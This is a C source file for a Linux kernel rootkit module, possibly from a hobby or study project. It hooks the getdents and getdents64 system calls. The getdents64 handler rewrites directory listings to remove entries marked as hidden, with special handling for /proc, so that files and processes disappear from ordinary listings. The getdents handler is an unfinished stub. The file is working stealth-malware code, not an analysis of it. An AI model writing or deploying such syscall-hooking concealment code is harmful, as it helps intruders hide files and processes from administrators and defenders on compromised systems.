#include "files.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include "utils.h"
#include <linux/printk.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_getdents syscall hook handler
SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd, dirent_t __user *,
                      p_dirent, unsigned int, ui32_count)
{
    pr_info("[ROOTKIT] getdents(%u, %p, %u)\n", ui32_fd, p_dirent, ui32_count);
    // TODO: Implement same logic as getdents64
    // Maybe use a common function

    return orig_getdents(p_regs);
}

// sys_getdents64 syscall hook handler
SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd,
                      dirent64_t __user *, p_dirent, unsigned int, ui32_count)
{
    long l_ret_orig          = 0;     // Original return value of the real syscall
    long l_ret               = 0;     // Value that will be returned to the caller
    long l_err               = 0;     // Error code of the copy functions
    long l_move_len          = 0;     // Length of the data to move
    unsigned short us_reclen = 0;     // Length of the current directory entry
    const char *s_pathname   = NULL;  // Pathname of the directory
    const file_t *p_file     = NULL;  // File structure of the directory
    bool b_is_proc_root      = false; // Is the directory /proc/?

    dirent64_t *p_dirent_k  = NULL; // Kernel buffer for directory entry array
    dirent64_t *p_dirent_it = NULL; // Directory entry array iterator

    pr_info("[ROOTKIT] getdents64(%u, %p, %u)", ui32_fd, p_dirent, ui32_count);

    l_ret_orig = orig_getdents64(p_regs);
    pr_cont(" = %ld\n", l_ret_orig);

    p_file = fd_get_file(ui32_fd);

    s_pathname = file_get_pathname(p_file);
    IF_U (IS_ERR_OR_NULL(s_pathname)) {
        s_pathname = kstrdup_const("(error)", GFP_KERNEL);
    }
    pr_info("[ROOTKIT] * Directory name: %s\n", s_pathname);
    kfree_const(s_pathname);

    if (l_ret_orig <= 0) {
        // No entries or error, return immediately
        IF_L (l_ret_orig == 0) {
            pr_info("[ROOTKIT] * No entries\n");
        }
        else {
            pr_err("[ROOTKIT] * Error: %ld\n", l_ret_orig);
        }
        return l_ret_orig;
    }

    p_dirent_k = kzalloc(l_ret_orig, GFP_KERNEL);

    IF_U (p_dirent_k == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory\n");
        return l_ret_orig;
    }

    // Copy data from user to kernel
    l_err = copy_from_user(p_dirent_k, p_dirent, l_ret_orig);

    IF_U (l_err != 0) {
        pr_err("[ROOTKIT] * Could not copy data from user\n");
        kfree(p_dirent_k);
        return l_ret_orig;
    }

    pr_info("[ROOTKIT] * Directory entries:\n");

    p_dirent_it = p_dirent_k;
    l_ret       = l_ret_orig;

    // Check if the directory is /proc/
    b_is_proc_root = is_proc_root(p_file);

    // Loop over the directory entries until the end of the buffer is reached
    // or the current directory entry is empty
    while ((char *)p_dirent_it < (char *)p_dirent_k + l_ret && p_dirent_it->d_reclen != 0) {
        pr_info("[ROOTKIT]   * %s\n", p_dirent_it->d_name);

        us_reclen = p_dirent_it->d_reclen;

        // Check if the current directory entry has to be hidden
        IF_U (is_file_hidden(p_dirent_it->d_name, b_is_proc_root)) {
            pr_info("[ROOTKIT]     * Hiding directory entry\n");

            IF_L ((char *)p_dirent_it + us_reclen < (char *)p_dirent_k + l_ret) {
                // The current directory entry is not the last one,
                // so we have to move the next entries to the current position

                // Length of the data to move is equal to the total length of the buffer,
                // minus the length of what we've already read (iterator pos minus start pos),
                // minus the length of the current directory entry (which we want to hide)
                l_move_len = l_ret - ((char *)p_dirent_it - (char *)p_dirent_k) - us_reclen;
                memmove(p_dirent_it, (char *)p_dirent_it + us_reclen, l_move_len);
            }

            // Decrease the total length to account for the hidden directory entry
            l_ret -= us_reclen;
        }
        else {
            // Move the iterator to the next directory entry
            p_dirent_it = (dirent64_t *)((char *)p_dirent_it + us_reclen);
        }
    }

    // Copy data back to user
    l_err = copy_to_user(p_dirent, p_dirent_k, l_ret);

    IF_L (l_err == 0) {
        // Erase the rest of the user buffer to avoid leaking data
        l_err = clear_user((char *)p_dirent + l_ret, l_ret_orig - l_ret);
        IF_U (l_err != 0) {
            pr_err("[ROOTKIT] * Could not clear user buffer\n");
        }
    }
    else {
        pr_err("[ROOTKIT] * Could not copy data back to user\n");
    }

    kfree(p_dirent_k);
    return l_ret;
}
